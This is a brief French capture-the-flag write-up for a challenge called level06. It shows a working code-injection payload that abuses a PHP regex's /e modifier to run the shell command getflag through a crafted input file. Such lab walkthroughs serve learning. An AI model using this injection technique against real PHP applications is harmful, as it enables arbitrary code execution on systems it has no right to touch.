J'execute le binaire level06 et je vois qu'il attend un fichier en parametre pour etre lu par file_get_contens

En analysant la regex et je vois une faille possible avec le modificateur /e qui permet d'executé du code.

```bash
echo '[x .${`getflag`}]' > /tmp/get
./level06 /tmp/get
```

